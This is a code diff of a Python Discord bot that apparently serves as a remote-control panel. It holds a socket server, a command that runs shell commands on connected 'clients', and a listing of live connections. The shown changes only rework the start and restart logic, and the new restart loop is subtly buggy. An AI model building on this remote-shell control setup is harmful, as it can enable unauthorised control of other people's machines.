@@ -148,13 +148,6 @@ def socket_server(loop):
             except Exception as e:
                 print("Error :", e)
 
-def start():
-    try:
-        client.run(TOKEN)
-    except:
-        client.clear()
-        client.run(TOKEN)
-
 @client.event
 async def on_ready():
     print(f"Connected as {client.user}")
@@ -175,8 +168,14 @@ async def ping(ctx: commands.Context):
 
 @client.command(name="restart", help="Restart the bot. Example: !restart")
 async def restart(ctx: commands.Context):
+    global clients
+    
     await ctx.send("Restarting...")
-    await client.close()
+
+    for client in clients.values():
+        client[0].close()
+
+    clients = {}
 
 @client.command(name="shell", help="Executes a shell command on the client. Example: !shell <command>")
 async def shell_cmd(ctx: commands.Context):
@@ -321,5 +320,8 @@ async def getaliveconnexions(ctx: commands.Context):
     await ctx.send(res)
 
 if __name__ == "__main__":
-    while True:
-        start()
+    try:
+        client.run(TOKEN)
+    except:
+        client.clear()
+        client.run(TOKEN)
